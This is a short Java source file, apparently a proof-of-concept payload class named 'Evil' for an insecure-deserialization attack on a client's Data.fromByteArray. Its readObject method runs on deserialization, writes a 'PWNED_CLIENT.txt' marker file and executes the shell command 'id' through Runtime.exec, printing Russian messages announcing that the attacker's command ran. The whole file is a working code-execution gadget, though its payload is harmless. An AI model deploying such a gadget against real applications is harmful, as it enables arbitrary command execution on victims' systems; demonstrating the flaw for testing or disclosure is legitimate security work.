import java.io.*;
public class Evil implements Serializable {
    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        try {
            FileWriter w = new FileWriter("PWNED_CLIENT.txt");
            w.write("Код атакующего выполнился внутри Data.fromByteArray\n"); w.close();
            Process p = Runtime.getRuntime().exec(new String[]{"id"});
            System.out.println("  [!!!] ВЫПОЛНЕНА КОМАНДА АТАКУЮЩЕГО: id -> " +
                new String(p.getInputStream().readAllBytes()).trim());
        } catch (Exception e) { System.out.println("  payload err: " + e); }
    }
}
